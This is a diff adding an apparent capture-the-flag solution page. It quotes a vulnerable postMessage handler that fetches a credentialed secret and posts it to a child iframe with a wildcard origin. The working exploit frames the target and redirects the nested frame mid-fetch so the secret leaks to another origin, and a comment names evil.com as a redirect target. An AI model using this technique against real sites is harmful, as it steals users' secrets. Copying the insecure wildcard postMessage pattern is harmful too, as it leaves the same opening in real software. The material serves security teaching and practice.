@@ -1,0 +1,42 @@
+<html>
+ <body>
+   <!--
+	<script>
+   // Vulnerable Code
+   window.addEventListener("message", function(event){
+        // postMessage origin is propery validated.
+		if(event.origin === 'http://ctf.s1r1us.ninja:13377'){
+			// Fetch Secret, and send it to child iframe.
+			const resp = fetch('/secret',{
+					method: 'GET',
+					credentials: 'include'
+			}).then(function(response){
+				// Reference to child iframe is created after the fetch, \
+				// Can we just change frames[0].frames[0].location="//evil.com" \
+				// if parent is frameable, during the fetch?                
+				const iframe = document.getElementsByTagName("iframe")[0].contentWindow;
+                iframe.postMessage({secret:response.headers.get('Secret')},'*');
+			}).catch(function(error){
+					console.error(error);
+			});
+			}
+		});   
+   </script>
+   -->
+   <!-- Solution -->
+   <iframe name=x src="http://ctf.s1r1us.ninja:1337/"></iframe>
+    <script>
+   	function sleep(ms){
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+    x.onload = function(){
+      	// Wait for the child iframe to load and let it send postMessage requesting secret
+        sleep(3000).then(function(){  
+            // While parent fetching the secret, change the child iframe location.
+        	x.frames[0].location="http://ctf.s1r1us.ninja";
+     	});
+     }
+
+    </script>
+</body>
+</html>
